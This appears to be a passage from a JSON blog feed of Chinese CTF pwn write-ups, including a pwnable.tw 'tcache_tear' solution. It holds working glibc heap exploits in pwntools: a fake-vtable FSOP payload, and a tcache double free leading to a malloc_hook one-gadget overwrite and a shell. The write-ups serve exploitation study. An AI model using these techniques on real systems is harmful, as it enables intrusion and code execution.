class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Size of page :&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content :&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index of page :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index of page :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content:&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">updatename</span>(<span class=\"params\">i,name=<span class=\"string\">&quot;&quot;</span></span>):</span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,i)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> i==<span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">\t\tthename(name)</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b malloc&#x27;</span>)</span><br><span class=\"line\">thename(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#now the size0 is 0x20+3,wocan overflow 3 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x18</span>+p32(<span class=\"number\">0xfe1</span>)+<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">heap_addr = u64(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x1000</span>,<span class=\"string\">&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tadd(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;AAAAAAAA&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">main_arena = u64(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libcbase = main_arena - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">list_all = <span class=\"number\">0x3c5520</span>+libcbase</span><br><span class=\"line\">system =libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;main_arena : &quot;</span>,<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">fakechunk =b&#x27;\\x00&#x27;*0x2b0</span></span><br><span class=\"line\"><span class=\"string\">pad =b&#x27;/bin/sh\\x00&#x27;+p64(0x61)</span></span><br><span class=\"line\"><span class=\"string\">pad+= p64(main_arena) +p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class=\"line\"><span class=\"string\">pad =pad.ljust(0xc0,b&#x27;\\x00&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">pad +=p64(0xffffffffffffffff)</span></span><br><span class=\"line\"><span class=\"string\">pad = pad.ljust(0xd8,b&#x27;\\x00&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">vtable  = heap_addr+0x10+0x2b0 + 0xd8 + 0x8</span></span><br><span class=\"line\"><span class=\"string\">pad += p64(vtable)</span></span><br><span class=\"line\"><span class=\"string\">fake_vtable = p64(0)*2+p64(1)+p64(system)</span></span><br><span class=\"line\"><span class=\"string\">fakechunk+=pad+fake_vtable</span></span><br><span class=\"line\"><span class=\"string\">edit(0,fakechunk)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">data = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x2b0</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"number\">0x61</span>)+p64(main_arena)+p64(list_all-<span class=\"number\">0x10</span>)+p64(<span class=\"number\">2</span>)+p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">vtable = heap_addr + <span class=\"number\">0x2b0</span> + <span class=\"number\">0xd8</span> + <span class=\"number\">0x8</span>+<span class=\"number\">0x10</span></span><br><span class=\"line\">payload += p64(vtable)</span><br><span class=\"line\">payload +=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,data + payload)</span><br><span class=\"line\">ch(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Size of page :&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/01/tcache-tear/",
            "url": "http://example.com/2022/04/01/tcache-tear/",
            "title": "tcache_tear",
            "date_published": "2022-04-01T12:21:22.000Z",
            "content_html": "<h1 id=\"pwnabletw\"><a class=\"markdownIt-Anchor\" href=\"#pwnabletw\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUudHc=\">pwnable.tw</span> \ttcache_tear</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ checksec --file=tcache_tear</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols\t  Yes\t<span class=\"number\">1</span>\t\t<span class=\"number\">2</span>\t\ttcache_tear</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ strings libc<span class=\"number\">-2.27</span>.so | grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC <span class=\"number\">2.27</span><span class=\"number\">-3u</span>buntu1) stable release version <span class=\"number\">2.27</span>.</span><br><span class=\"line\">&lt;https:<span class=\"comment\">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>64 位程序，FULLrelro 导致不能改写 got</p>\n<p>但是因为这个 libc 版本太老，tcache 不会检查 double free</p>\n<h2 id=\"主要程序\"><a class=\"markdownIt-Anchor\" href=\"#主要程序\">#</a> 主要程序：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sub_400948(a1, a2, a3);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name:&quot;</span>);</span><br><span class=\"line\">  read_name((__int64)&amp;name, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      menu();</span><br><span class=\"line\">      v3 = get_num();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 &lt;= <span class=\"number\">7</span> )                            <span class=\"comment\">// 限制释放次数</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        info();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">4</span> )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">LABEL_14:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_14;</span><br><span class=\"line\">      add();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只允许 8 次 free，而且还有 tcache，ptr 指针存在 uaf，但是没有编辑函数，输出的是 name，对于 name 输入输出限制大小都在 0x20 没有溢出以及泄露 ptr 的可能。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">  v0 = get_num();</span><br><span class=\"line\">  size = v0;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xFF</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ptr = <span class=\"built_in\">malloc</span>(v0);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data:&quot;</span>);</span><br><span class=\"line\">    read_name((__int64)ptr, size - <span class=\"number\">16</span>);         <span class=\"comment\">// 溢出</span></span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>add 读入数据时存在数字类型转换溢出，当 size&lt;16 时，读入非常大的数据，可以覆盖 topchunk</p>\n<h2 id=\"loading\"><a class=\"markdownIt-Anchor\" href=\"#loading\">#</a> loading:</h2>\n<p>1：最主要的问题，如何泄露 libc 的地址。尝试攻击 stdout 结构体</p>\n<p>largebin 不走 tcache，但是走 unsortedbin，所以伪造 fakechunk 进 sortedbin，低版本的 libc2.27 可以 tcache double free, 很容易拿到 name，并且实现超长数据写（size&lt;16)</p>\n<p>我们将 name 伪造成 largechunk，free 后进 unsortedbins，泄露 libc，然后同样手法修改 malloc_hook，这次需要 realloc 调栈</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.log_level=&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#r=process(&#x27;./tcache_tear&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10207</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&#x27;./tcache_tear&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\">name=<span class=\"number\">0x602060</span></span><br><span class=\"line\"><span class=\"comment\">#fake chunksize 0x91,name size is 0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\">gp = <span class=\"number\">0x602088</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Data:&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class=\"line\">offset = gp-name</span><br><span class=\"line\">fakechunk=p64(<span class=\"number\">0x602060</span>)+p64(<span class=\"number\">0x501</span>)</span><br><span class=\"line\">fakechunk +=<span class=\"string\">b&#x27;\\x00&#x27;</span>*(offset-<span class=\"number\">0x10</span>)+p64(name+<span class=\"number\">0x10</span>)+<span class=\"string\">b&#x27;\\x00&#x27;</span>*(<span class=\"number\">0x602560</span>-<span class=\"number\">0x602090</span>+<span class=\"number\">8</span>)+p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">fakechunk +=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x18</span> + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;Name:&quot;</span>,p64(<span class=\"number\">0x602060</span>))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">10</span>,p64(name))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">10</span>,fakechunk)</span><br><span class=\"line\">free()</span><br><span class=\"line\">ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;\\x05&quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr_96 = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">malloc_hook = main_addr_96-<span class=\"number\">0x70</span></span><br><span class=\"line\">realloc_hook = malloc_hook-<span class=\"number\">0x8</span></span><br><span class=\"line\">libcbase = main_addr_96 - <span class=\"number\">0x3ebca0</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\">onegadget = libcbase +<span class=\"number\">0x010a38c</span></span><br><span class=\"line\">realloc = libcbase + libc.sym[<span class=\"string\">&#x27;realloc&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;realloc _: &quot;</span>,<span class=\"built_in\">hex</span>(realloc))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,p64(malloc_hook-<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">10</span>,p64(onegadget)+p64(realloc+<span class=\"number\">6</span>))</span><br><span class=\"line\">ch(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">&quot;10&quot;</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/01/note-file/",
            "url": "http://example.com/2022/04/01/note-file/",
            "title": "note_file",
            "date_published": "2022-04-01T08:25:12.000Z",
            "content_html": "<h1 id=\"unsortedbin_attack-global_max_fast\"><a class=\"markdownIt-Anchor\" href=\"#unsortedbin_attack-global_max_fast\">#</a> unsortedbin_attack  global_max_fast</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ file note_five </span><br><span class=\"line\">note_five: ELF <span class=\"number\">64</span>-bit LSB shared object, x86<span class=\"number\">-64</span>, version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class=\"number\">-64.</span>so<span class=\"number\">.2</span>, <span class=\"keyword\">for</span> GNU/Linux <span class=\"number\">2.6</span><span class=\"number\">.32</span>, BuildID[sha1]=<span class=\"number\">99</span>cce6e83f71ad3fa44410c59cd5a40b4ade1acb, stripped</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ checksec --file=note_five</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/ruan/attack_global_max_fast/note_five&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"主要程序\"><a class=\"markdownIt-Anchor\" href=\"#主要程序\">#</a> 主要程序：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;infomation management:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. new info&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. edit info&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. delete info&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. 